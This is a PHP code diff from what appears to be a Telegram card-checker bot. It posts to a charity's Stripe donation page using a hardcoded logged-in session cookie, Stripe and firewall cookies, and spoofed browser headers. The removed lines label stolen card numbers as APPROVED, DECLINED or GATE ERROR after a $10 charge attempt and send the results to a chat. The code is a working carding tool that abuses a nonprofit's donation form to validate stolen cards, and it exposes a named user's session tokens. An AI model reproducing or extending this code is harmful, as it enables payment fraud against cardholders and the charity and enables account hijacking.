+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2020%3A04%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-30%2020%3A04%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=ed9acd73c817522d26e819b0cfc4e423; __stripe_mid=9b1a0ea1-0156-4186-9458-c4e8fe27376f75e12a; __stripe_sid=e8d0ef65-cbfe-4a06-980f-007ab0e3293d922cf1; wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez-6019%7C1734206856%7Chn6GYxnU76sz0R0Vgotg9rjfL5wbxk85jfucUf92y1M%7C1d3a440d52aca054b16825ba30fb4d92b7be0a6a191ad86016bb2aec1ff6e7fa; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19118%7C%7C1733169952%7C%7C1733166352%7C%7C77a77fe5309e22612909f381962748e7; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19118%7Cother%7Cread%7Caed4d4f6aae423a49e392ed087989ec1b5de69732a5c9794c096926523df75fa; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
     'x-requested-with: XMLHttpRequest',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-    'accept-language: es-US,es;q=0.9',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
     'origin: https://facesandvoicesofrecovery.org',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
     'referer: https://facesandvoicesofrecovery.org/engage/donate/',
   ],
 ]);
-	
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
-//echo "$response\n";
-$json = json_decode($response, true);
-$respo = trim(strip_tags($json['messages']));
-$partes = explode(':', $respo);
-$respo = trim($partes[1]);
 curl_close($curl);
-sendPv($myid, response);
 	
-$result = $json['result'];
-if ($result == "success"){
-$respo = "Charged $10";
-}
-	
-$timetakeen = (microtime(true) - $startTime);
-$time = substr_replace($timetakeen, '', 4);
-$proxy = "LIVE ✅";
+editMessage($chat_id, $response, $id_text);
 
-$bin = "<code>".$bin."</code>";
-$lista = "<code>".$lista."</code>";
-
-if (empty($respo)) {
-        $respo = $response;
-}
-
-if (array_in_string($respo, $live_array)) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
-    $live = True;
-} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
-    $live = False;
-} else {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe ($10)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
-    $live = False;
-}
-
-if ($live) {
-    editMessage($chat_id, $respuesta, $id_text);
-} else {
-    editMessage($chat_id, $respuesta, $id_text);
-}
-
-//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
-ob_flush();
 
 }
 
